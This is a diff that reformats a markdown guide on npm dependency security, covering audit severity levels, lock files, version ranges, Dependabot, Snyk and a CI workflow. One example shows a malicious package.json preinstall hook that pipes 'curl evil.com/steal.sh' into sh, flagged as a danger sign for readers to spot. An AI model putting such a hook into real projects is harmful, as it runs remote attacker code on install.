@@ -20,12 +20,12 @@ npm audit fix --force
 
 ### Understanding Severity Levels
 
-| Level | Description | Action |
-|-------|-------------|--------|
-| Critical | Actively exploited | Fix immediately |
-| High | Easily exploitable | Fix ASAP |
-| Moderate | Requires specific conditions | Plan to fix |
-| Low | Minimal impact | Fix when convenient |
+| Level    | Description                  | Action              |
+| -------- | ---------------------------- | ------------------- |
+| Critical | Actively exploited           | Fix immediately     |
+| High     | Easily exploitable           | Fix ASAP            |
+| Moderate | Requires specific conditions | Plan to fix         |
+| Low      | Minimal impact               | Fix when convenient |
 
 ## 2. Lock Files
 
@@ -46,8 +46,8 @@ yarn install --frozen-lockfile
 // package.json - use exact versions
 {
   "dependencies": {
-    "express": "4.18.2",  // Exact version
-    "lodash": "^4.17.21"  // Allows minor updates (risky)
+    "express": "4.18.2", // Exact version
+    "lodash": "^4.17.21" // Allows minor updates (risky)
   }
 }
 ```
@@ -60,13 +60,13 @@ yarn install --frozen-lockfile
 # .github/dependabot.yml
 version: 2
 updates:
-  - package-ecosystem: "npm"
-    directory: "/"
+  - package-ecosystem: 'npm'
+    directory: '/'
     schedule:
-      interval: "weekly"
+      interval: 'weekly'
     open-pull-requests-limit: 10
     reviewers:
-      - "security-team"
+      - 'security-team'
 ```
 
 ### Snyk Integration
@@ -104,10 +104,10 @@ MAJOR.MINOR.PATCH
 // package.json ranges
 {
   "dependencies": {
-    "express": "4.18.2",    // Exact: Safest
-    "lodash": "~4.17.21",   // Patch updates only
-    "axios": "^1.4.0",      // Minor + Patch (common, less safe)
-    "react": "*"            // Any version (NEVER do this!)
+    "express": "4.18.2", // Exact: Safest
+    "lodash": "~4.17.21", // Patch updates only
+    "axios": "^1.4.0", // Minor + Patch (common, less safe)
+    "react": "*" // Any version (NEVER do this!)
   }
 }
 ```
@@ -136,8 +136,8 @@ npm view <package-name> time
 // Check for suspicious scripts in package.json
 {
   "scripts": {
-    "preinstall": "curl evil.com/steal.sh | sh",  // 🚨 DANGER!
-    "postinstall": "node malicious.js"            // 🚨 DANGER!
+    "preinstall": "curl evil.com/steal.sh | sh", // 🚨 DANGER!
+    "postinstall": "node malicious.js" // 🚨 DANGER!
   }
 }
 ```
@@ -207,20 +207,20 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      
+
       - name: Setup Node
         uses: actions/setup-node@v3
         with:
           node-version: '18'
-          
+
       - name: Install dependencies
         run: npm ci
-        
+
       - name: Run security audit
         run: npm audit --audit-level=high
-        
+
       - name: Run Snyk
-        uses: snyk/actions/node@v1.1234.0  # Use specific version tag, not master
+        uses: snyk/actions/node@v1.1234.0 # Use specific version tag, not master
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
 ```
@@ -250,4 +250,3 @@ npm uninstall unused-package
 # Clean npm cache
 npm cache clean --force
 ```
-
